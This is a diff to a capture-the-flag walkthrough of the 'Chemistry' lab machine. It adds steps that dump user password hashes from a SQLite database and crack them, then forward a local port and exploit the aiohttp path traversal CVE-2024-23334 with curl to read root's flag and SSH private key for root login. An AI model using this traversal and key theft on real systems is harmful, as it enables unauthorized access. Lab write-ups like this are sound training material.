@@ -116,14 +116,22 @@ $ cat app.py
 ```
 ![appPy](Images/appPy.png)
 
-Reading the database.db file in the instance folder we can see the user Rosa referenced with a string of characters afterward. This appears to be a password hash.
+We can read the database.db file using sqlite command. From this we can see multiple users and their password hashes. We are intested in Rosa and her password hash.
 ```
+$ ls
+app.py
+instance
+static
+templates
+uploads
 $ cd instance
 $ ls
 database.db
-$ cat database.db
+$ sqlite3 database.db .dump
 ```
-![databaseDb](Images/databaseDb.png)
+![databaseDb1](Images/databaseDb1.png)
+
+![databaseDb2](Images/databaseDb2.png)
 
 We can either try to crack the password hash locally using a tool such as JohnTheRipper.
 Alternatively, I have used the site crackstation.net, which will check and see if they have the password for the provided password hash.
@@ -143,4 +151,54 @@ The login was successful. We can now read the user.txt file and obtain the user 
 
 
 ## Root Flag
+
+We can check locally running network services using the below command. This shows us that we have a service (likely a web server) running on 8080 (localhost).
+
+```
+ss -lntp
+curl localhost:8080
+```
+
+![localhost](Images/localhost.png)
+
+Now, we will change to a local shell on our attacking machine and run the below command to forward the service running on port 8080 on the chemistry box to our attacking machine on port 4000.
+
+```
+ssh -L 4000:localhost:8080 rosa@chemistry.htb
+
+```
+![portForward](Images/portForward.png)
+
+Next, we can check details on the server and technology it is using. 
+
+```
+whatweb localhost:4000
+```
+![whatWeb](Images/whatWeb.png)
+
+We see that it is using aiohttp/3.9.1. Checking for vulnerabilites on this and we can find an exploit for CVE-2024–23334. 
+Reading the vulnerability we can see that a curl command like below can exploit the path traversal vulnerability.
+Again, these commands are run on the local attacking machine.
+
+```
+curl -s --path-as-is "http://localhost:4000/assets/../../../root/root.txt"
+```
+![rootTxt](Images/rootTxt.png)
+
+This could also be used to gain root access by reading SSH private key for root.
+```
+curl -s --path-as-is "http://localhost:4000/assets/../../../../root/.ssh/id_rsa" > root.pem
+chmod 600 root.pem
+ssh -i root.pem root@chemistry.htb
+```
+![rootKey](Images/rootKey.png)
+
+As we are logging in as root, we can simply cat root.txt to obtain the flag.
+
+![rootLog](Images/rootLog.png)
+
+
+Congratulations Chemistry has been successfully Pwned!
+
+![pwned](Images/pwned.png)
 
